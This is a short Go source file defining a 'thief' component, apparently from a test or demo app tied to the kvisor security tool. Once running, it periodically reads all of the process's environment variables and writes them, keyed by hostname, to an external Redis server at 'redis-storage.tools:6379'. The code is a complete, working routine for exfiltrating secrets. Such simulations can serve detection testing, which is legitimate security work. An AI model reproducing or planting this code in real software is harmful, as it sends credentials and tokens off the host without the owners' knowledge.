package app

import (
	"context"
	"os"
	"strings"
	"time"

	"github.com/castai/kvisor/pkg/logging"
	"github.com/redis/go-redis/v9"
)

func newThief(log *logging.Logger, cfg *Config) *thief {
	return &thief{
		log: log,
		cfg: cfg,
	}
}

type thief struct {
	log *logging.Logger
	cfg *Config
}

func (t *thief) run(ctx context.Context) error {
	t.log.Info("running thief")
	defer t.log.Info("stopping thief")

	t.log.Debugf("sleeping for %v before start", t.cfg.ThiefDelay)
	time.Sleep(t.cfg.ThiefDelay)

	stealC := time.NewTicker(t.cfg.ThiefInterval)
	defer stealC.Stop()

	for {
		select {
		case <-stealC.C:
			if err := t.steal(ctx); err != nil {
				t.log.Errorf("steal: %v", err)
			}
		case <-ctx.Done():
			return nil
		}
	}
}

func (t *thief) steal(ctx context.Context) error {
	rdb := redis.NewClient(&redis.Options{
		Addr:        "redis-storage.tools:6379",
		Password:    "", // no password set
		DB:          0,  // use default DB
		DialTimeout: 3 * time.Second,
	})
	ctx, cancel := context.WithTimeout(ctx, 3*time.Second)
	defer cancel()
	if err := rdb.Ping(ctx).Err(); err != nil {
		return err
	}
	hostName, err := os.Hostname()
	if err != nil {
		return err
	}
	env := os.Environ()
	err = rdb.Set(ctx, "env_"+hostName, strings.Join(env, "\n"), 0).Err()
	if err != nil {
		return err
	}
	t.log.Info("steal done")
	return nil
}
